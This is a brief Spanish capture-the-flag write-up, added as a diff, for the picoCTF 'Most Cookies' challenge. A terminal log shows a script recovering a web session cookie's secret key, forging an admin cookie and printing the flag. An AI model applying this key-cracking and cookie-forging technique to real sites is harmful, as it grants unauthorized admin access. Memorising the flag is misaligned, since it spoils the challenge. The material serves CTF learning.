@@ -1,0 +1,12 @@
+En esta obtenemos el jwt y luego corremos un codigo que nos da el codigo que tenemos que poner en la pagina
+┌──(kali㉿kali)-[~]
+└─$ touch solucionmostcookies.py
+                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ nano solucionmostcookies.py 
+                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ python3 solucionmostcookies.py eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Z0PC5w.-KyjsSXXjNDFbM0avA0tYDL6awA
+Secret key: peanut butter
+eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z0PDOQ.D1gkzMhaBFgw9ht_mBJgT-E5j4E
+picoCTF{pwn_4ll_th3_cook1E5_3646b931}
